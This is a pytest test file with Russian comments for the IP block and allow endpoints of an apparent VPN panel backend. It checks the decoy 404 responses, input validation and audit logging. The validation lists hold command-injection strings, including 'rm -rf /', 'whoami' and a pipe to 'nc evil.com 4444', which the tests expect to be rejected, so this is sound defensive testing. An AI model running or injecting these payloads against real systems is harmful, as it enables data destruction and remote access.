import pytest
from backend.database import db_session
from backend.models import ClientStats, Inbound, AuditLog


def test_firewall_block_ip_security(client, monkeypatch):
    """
    Тестирование защиты и функционала /api/security/block-ip:
    1. Запрос без авторизации -> 404 Decoy.
    2. Отклонение некорректных форматов IP и попыток инъекций (Shell / Command Injection).
    3. Успешная блокировка валидного IPv4 / CIDR со сбросом сессий пользователя и записью в аудит.
    """
    headers = {"Authorization": "Bearer test_bearer_token"}
    
    # 1. Decoy protection
    unauth_res = client.post("/api/security/block-ip", json={"ip": "1.2.3.4"})
    assert unauth_res.status_code == 404
    assert "404 Not Found" in unauth_res.text

    # 2. Validation: пустой IP
    res_empty = client.post("/api/security/block-ip", json={"ip": ""}, headers=headers)
    assert res_empty.status_code == 200
    assert res_empty.json()["success"] is False

    # 2.1. Validation: инъекции и некорректный формат IP
    malicious_ips = [
        "1.2.3.4; rm -rf /",
        "1.2.3.4 & whoami",
        "1.2.3.4 | nc evil.com 4444",
        "999.999.999.999",
        "not_an_ip",
        "1.2.3.4\r\nDROP",
        "1.2.3.4/128/24"
    ]
    for bad_ip in malicious_ips:
        res = client.post("/api/security/block-ip", json={"ip": bad_ip}, headers=headers)
        assert res.status_code == 200
        assert res.json()["success"] is False, f"Expected validation failure for payload: {bad_ip}"

    # 3. Валидная блокировка с вызовом kick_client
    kicked_users = []
    monkeypatch.setattr("backend.sentinel_core_bridge.kick_client", lambda email: kicked_users.append(email) or True)

    target_ip = "198.51.100.77"
    target_user = "threat_actor@evil.corp"

    res_valid = client.post(
        "/api/security/block-ip",
        json={"ip": target_ip, "email": target_user},
        headers=headers
    )
    assert res_valid.status_code == 200
    assert res_valid.json()["success"] is True
    assert res_valid.json()["ip"] == target_ip
    assert target_user in kicked_users

    # Проверяем запись в AuditLog
    with db_session() as session:
        log = session.query(AuditLog).filter_by(action="block_ip", target=target_ip).first()
        assert log is not None
        assert target_user in log.details


def test_firewall_allow_ip_security(client):
    """
    Тестирование защиты и функционала /api/security/allow-ip:
    1. Запрос без авторизации -> 404 Decoy.
    2. Отклонение некорректных форматов IP.
    3. Добавление IP в список доверенных IP (allowed_ips) клиента в БД и аудит.
    """
    headers = {"Authorization": "Bearer test_bearer_token"}

    # 1. Decoy protection
    unauth_res = client.post("/api/security/allow-ip", json={"ip": "1.2.3.4"})
    assert unauth_res.status_code == 404

    # 2. Validation: некорректный IP
    for bad_ip in ["", "invalid", "256.256.256.256", "1.2.3.4; echo evil"]:
        res = client.post("/api/security/allow-ip", json={"ip": bad_ip}, headers=headers)
        assert res.status_code == 200
        assert res.json()["success"] is False

    # 3. Подготовка клиента в БД
    target_email = "trusted_user@corporate.net"
    with db_session() as session:
        session.query(ClientStats).filter_by(email=target_email).delete()
        ib = session.query(Inbound).first()
        if not ib:
            ib = Inbound(remark="Firewall Inbound", port=44111, protocol="vless", enable=1)
            session.add(ib)
            session.commit()
            
        c = ClientStats(
            inbound_id=ib.id,
            email=target_email,
            client_uuid_or_pwd="uuid-trust-1",
            allowed_ips="10.0.0.1",
            enable=1
        )
        session.add(c)
        session.commit()

    # Добавляем новый доверенный IP через API
    trusted_ip = "192.0.2.55"
    res_allow = client.post(
        "/api/security/allow-ip",
        json={"ip": trusted_ip, "email": target_email},
        headers=headers
    )
    assert res_allow.status_code == 200
    assert res_allow.json()["success"] is True

    # Проверяем обновление allowed_ips в БД
    with db_session() as session:
        client_db = session.query(ClientStats).filter_by(email=target_email).first()
        assert client_db is not None
        assert "10.0.0.1" in client_db.allowed_ips
        assert trusted_ip in client_db.allowed_ips

        # Проверяем запись в AuditLog
        log = session.query(AuditLog).filter_by(action="allow_ip", target=trusted_ip).first()
        assert log is not None
        assert target_email in log.details
